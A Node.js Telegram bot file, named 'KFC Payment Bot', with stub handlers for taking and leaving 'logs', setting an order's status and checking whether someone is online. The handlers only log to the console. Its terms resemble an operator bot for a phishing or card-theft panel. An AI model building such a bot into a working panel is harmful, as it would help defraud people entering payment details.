const { Telegraf } = require('telegraf');
const config = require('./telegram-bot-config');

// Create bot for payment processing
const bot = new Telegraf(config.bot.token);

// Error handling
bot.catch((err, ctx) => {
  console.error('Telegram bot error:', err);
});

// Start command
bot.command('start', (ctx) => {
  ctx.reply('🤖 KFC Payment Bot is active!\n\nThis bot processes payments for KFC application.');
});

// Handle payment status updates
bot.action(/^log_(.+)_setStatus_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const status = ctx.match[2];
  
  console.log(`Payment status updated: Order ${orderId} -> ${status}`);
  
  // Here you can add logic to update status in database
  // and notify user via web-sockets or polling
  
  await ctx.answerCbQuery(`Status updated: ${status}`);
});

// Handle taking log in work
bot.action(/^log_take_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`Log taken: Order ${orderId}`);
  await ctx.answerCbQuery('Log taken in work');
});

// Handle leaving log
bot.action(/^log_(.+)_leave$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`Log left: Order ${orderId}`);
  await ctx.answerCbQuery('Log left');
});

// Handle online status check
bot.action(/^eye_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`Eye check: Order ${orderId}`);
  await ctx.answerCbQuery('Checking online status');
});

// Launch bot
bot.launch().then(() => {
  console.log('🤖 KFC Payment Bot launched!');
  console.log('Bot Token:', config.bot.token.substring(0, 10) + '...');
  console.log('Logs Group ID:', config.bot.logsGroupId);
  console.log('Logging Group ID:', config.bot.loggingGroupId);
}).catch((error) => {
  console.error('Bot launch error:', error);
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
